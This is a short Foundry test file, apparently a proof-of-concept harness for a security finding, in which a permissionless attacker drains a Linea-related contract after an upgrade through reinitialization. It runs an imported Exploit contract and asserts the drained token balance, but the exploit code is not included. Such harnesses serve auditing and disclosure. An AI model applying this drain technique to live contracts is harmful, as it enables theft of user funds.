// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol"; import "./65618-after-the-upgrade-permissionless-attacker-can-fully-drain-th.sol";
contract LineaReinitDrainTest is Test { function test_reinitializeThenDrain() external {Exploit e=new Exploit();e.run();assertEq(e.token().balanceOf(address(e)),1000);} }
